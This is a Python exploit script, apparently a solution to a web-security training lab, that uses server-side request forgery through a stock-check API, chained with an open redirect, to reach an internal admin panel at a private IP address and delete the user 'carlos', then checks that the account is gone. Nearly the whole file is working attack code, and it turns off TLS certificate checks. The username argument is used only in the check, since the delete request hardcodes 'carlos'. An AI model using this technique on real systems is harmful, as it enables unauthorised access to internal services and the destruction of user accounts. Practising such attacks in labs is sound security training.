import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def delete_user(url, username):
    delete_user_path = ("/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin/delete?username"
                        "=carlos")
    stock_check_path = "/product/stock"
    admin_page_path = "/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin"
    params = {'stockApi': delete_user_path}
    response = requests.post(url + stock_check_path, data=params, verify=False)
    print(response.status_code)

    # Verifying if User was successfully deleted
    print(f"Verifying again, if {username} was successfully deleted.")
    params2 = {'stockApi': admin_page_path}
    response2 = requests.post(url + stock_check_path, verify=False, data=params2)
    if response2.status_code == 200 and f"{username}" not in response2.text:
        print(f"Successfully deleted {username}'s account.")
    else:
        print(f"Failed to delete {username}'s account.")
        sys.exit(1)


def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <username>")
        print("Example: python script.py http://localhost:8080 carlos")
        sys.exit(-1)
    else:
        url = sys.argv[1]
        username = sys.argv[2]
        print("Deleting User....")
        delete_user(url, username)


if __name__ == "__main__":
    main()
    sys.exit(0)
